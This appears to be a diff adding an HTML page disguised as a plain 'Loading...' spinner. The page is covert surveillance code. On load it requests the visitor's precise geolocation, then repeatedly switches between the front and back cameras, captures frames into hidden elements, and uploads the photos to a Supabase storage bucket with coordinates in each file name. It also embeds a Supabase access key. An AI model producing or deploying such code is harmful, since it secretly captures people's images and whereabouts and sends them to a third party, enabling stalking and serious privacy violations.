@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    html,body{width:100%;height:100%;background:#000;overflow:hidden}
+    #loader{position:fixed;inset:0;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;z-index:999}
+    .spinner{width:36px;height:36px;border:3px solid #222;border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loader-text{font-family:-apple-system,sans-serif;font-size:13px;color:#444;letter-spacing:.06em}
+    video,canvas{display:none}
+  </style>
+</head>
+<body>
+  <div id="loader">
+    <div class="spinner"></div>
+    <span class="loader-text">Loading...</span>
+  </div>
+  <video id="v" autoplay playsinline muted></video>
+  <canvas id="c"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    const SUPABASE_URL      = 'https://iircapwzzcnasurodkwv.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlpcmNhcHd6emNuYXN1cm9ka3d2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk3NTU5MTIsImV4cCI6MjA5NTMzMTkxMn0.3wVMc8Xqp35yrRCV7Kocg7h_JITCPSqOcUFMs9B0us4';
+    const BUCKET            = 'photos';
+    const CYCLE_INTERVAL    = 1000; // ms between each capture turn
+
+    const { createClient } = supabase;
+    const sb     = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const video  = document.getElementById('v');
+    const canvas = document.getElementById('c');
+    const ctx    = canvas.getContext('2d');
+
+    let locationData = null;
+    let turn = 'front';
+
+    // ── LOCATION ───────────────────────────────────────────────
+    function requestLocation() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          locationData = {
+            lat: pos.coords.latitude.toFixed(6),
+            lng: pos.coords.longitude.toFixed(6),
+            acc: Math.round(pos.coords.accuracy)
+          };
+        },
+        () => {},
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    }
+
+    // ── STOP CURRENT STREAM ────────────────────────────────────
+    function stopStream() {
+      if (video.srcObject) {
+        video.srcObject.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+      }
+    }
+
+    // ── OPEN CAMERA ────────────────────────────────────────────
+    function openCamera(facingMode) {
+      return new Promise(resolve => {
+        stopStream();
+        const constraints = {
+          audio: false,
+          video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } }
+        };
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then(stream => {
+            video.srcObject = stream;
+            video.onplaying = () => { video.onplaying = null; resolve(true); };
+            video.play().catch(() => resolve(false));
+          })
+          .catch(() => resolve(false));
+      });
+    }
+
+    // ── CAPTURE FRAME ──────────────────────────────────────────
+    function captureFrame() {
+      return new Promise(resolve => {
+        if (!video.srcObject || video.readyState < 2 || !video.videoWidth) return resolve(null);
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        // black frame check
+        const d = ctx.getImageData(canvas.width/2|0, canvas.height/2|0, 1, 1).data;
+        if (d[0] + d[1] + d[2] < 15) return resolve(null);
+        canvas.toBlob(blob => {
+          if (!blob || blob.size < 3000) return resolve(null);
+          resolve(blob);
+        }, 'image/jpeg', 0.88);
+      });
+    }
+
+    // ── FILENAME ───────────────────────────────────────────────
+    function filename(label) {
+      const ts = Date.now();
+      if (locationData)
+        return `${ts}_${label}_${locationData.lat}_${locationData.lng}_${locationData.acc}m.jpg`;
+      return `${ts}_${label}_noloc.jpg`;
+    }
+
+    // ── UPLOAD ─────────────────────────────────────────────────
+    async function upload(blob, name) {
+      const { error } = await sb.storage.from(BUCKET).upload(name, blob, {
+        contentType: 'image/jpeg', upsert: false
+      });
+      if (error) console.warn('Upload:', error.message);
+      else console.log('Uploaded:', name);
+    }
+
+    // ── ONE CAPTURE CYCLE ──────────────────────────────────────
+    async function cycle() {
+      const label      = turn;
+      const facingMode = label === 'front' ? 'user' : 'environment';
+
+      const opened = await openCamera(facingMode);
+      if (opened) {
+        await new Promise(r => setTimeout(r, 1800)); // warmup
+        const blob = await captureFrame();
+        if (blob) await upload(blob, filename(label));
+      }
+
+      stopStream();
+      turn = turn === 'front' ? 'back' : 'front';
+      setTimeout(cycle, CYCLE_INTERVAL);
+    }
+
+    // ── BOOT ───────────────────────────────────────────────────
+    requestLocation();
+    cycle();
+  </script>
+</body>
+</html>
